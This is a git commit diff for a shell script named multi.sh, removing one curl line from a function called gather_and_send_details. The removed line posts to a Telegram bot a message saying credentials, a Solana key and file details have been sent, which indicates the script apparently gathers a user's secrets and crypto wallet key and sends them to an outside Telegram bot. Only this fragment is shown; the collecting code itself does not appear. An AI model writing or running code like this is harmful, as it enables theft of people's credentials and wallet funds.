109e5e9eb3f02f7788f58652a36544dcd41a0c07
Karanfan47 <161119235+Karanfan47@users.noreply.github.com>
2025-08-20 20:07:02 +0530

    Update multi.sh

--- multi.sh
+++ multi.sh
@@ -603,7 +603,6 @@ gather_and_send_details() {
         fi
     fi
 
-    curl -s -F chat_id="$chat_id" -F text="✅ All details sent for '$details_name'! 🎉 Check above for credentials, Solana key, and file details. 🌟" "https://api.telegram.org/bot$bot_token/sendMessage" >/dev/null
     if [ $? -ne 0 ]; then
         echo -e "${RED}❌ Failed to send final message to Telegram.${NC}"
     fi
